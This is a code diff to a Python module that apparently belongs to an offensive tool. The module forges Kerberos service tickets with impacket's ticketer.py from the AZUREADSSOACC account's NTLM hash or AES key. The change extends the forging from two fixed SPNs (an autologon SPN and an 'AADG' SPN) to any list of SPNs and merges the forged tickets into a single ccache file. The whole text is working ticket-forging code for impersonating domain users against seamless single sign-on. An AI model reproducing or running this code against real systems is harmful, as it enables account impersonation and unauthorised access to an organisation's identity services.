@@ -24,7 +24,7 @@ def _build_ticketer_options(
         spn=spn,
         domain_sid=domain_sid,
         user_id=str(user_rid),
-        nthash=adssoacc_ntlm or "",
+        nthash=adssoacc_ntlm,
         aesKey=adssoacc_aes or None,
         groups=DEFAULT_GROUPS,
         duration=TICKET_DURATION_DAYS,
@@ -54,10 +54,6 @@ def _forge_single_ticket(
     adssoacc_aes: str | None,
     work_dir: str,
 ) -> str:
-    # Import from the installed script location; impacket installs ticketer.py
-    # as a console_script but also makes it importable from its installed path.
-    # Since it's not a proper importable module in all impacket versions, we
-    # import TICKETER by loading the script file directly.
     ticketer_path = os.path.join(
         os.path.dirname(sys.executable),
         "ticketer.py",
@@ -110,37 +106,45 @@ def forge_tickets(
     work_dir: str,
     adssoacc_ntlm: str | None = None,
     adssoacc_aes: str | None = None,
+    spns: list[str] | None = None,
 ) -> str:
-    spn1_path = _forge_single_ticket(
-        user=user,
-        domain=domain,
-        spn=AUTOLOGON_SPN,
-        domain_sid=domain_sid,
-        user_rid=user_rid,
-        adssoacc_ntlm=adssoacc_ntlm,
-        adssoacc_aes=adssoacc_aes,
-        work_dir=work_dir,
-    )
-    tmp_spn1 = spn1_path + ".spn1"
-    os.rename(spn1_path, tmp_spn1)
+    if spns is None:
+        spns = [AUTOLOGON_SPN, AADG_SPN]
 
-    spn2_path = _forge_single_ticket(
-        user=user,
-        domain=domain,
-        spn=AADG_SPN,
-        domain_sid=domain_sid,
-        user_rid=user_rid,
-        adssoacc_ntlm=adssoacc_ntlm,
-        adssoacc_aes=adssoacc_aes,
-        work_dir=work_dir,
-    )
-    tmp_spn2 = spn2_path + ".spn2"
-    os.rename(spn2_path, tmp_spn2)
+    if len(spns) == 1:
+        return _forge_single_ticket(
+            user=user,
+            domain=domain,
+            spn=spns[0],
+            domain_sid=domain_sid,
+            user_rid=user_rid,
+            adssoacc_ntlm=adssoacc_ntlm,
+            adssoacc_aes=adssoacc_aes,
+            work_dir=work_dir,
+        )
+
+    temp_paths = []
+    for i, spn in enumerate(spns):
+        path = _forge_single_ticket(
+            user=user,
+            domain=domain,
+            spn=spn,
+            domain_sid=domain_sid,
+            user_rid=user_rid,
+            adssoacc_ntlm=adssoacc_ntlm,
+            adssoacc_aes=adssoacc_aes,
+            work_dir=work_dir,
+        )
+        tmp = path + f".spn{i}"
+        os.rename(path, tmp)
+        temp_paths.append(tmp)
 
     combined_path = os.path.join(work_dir, "combined.ccache")
-    merge_ccaches(tmp_spn1, tmp_spn2, combined_path)
+    merge_ccaches(temp_paths[0], temp_paths[1], combined_path)
+    for i in range(2, len(temp_paths)):
+        merge_ccaches(combined_path, temp_paths[i], combined_path)
 
-    os.unlink(tmp_spn1)
-    os.unlink(tmp_spn2)
+    for tmp in temp_paths:
+        os.unlink(tmp)
 
     return combined_path
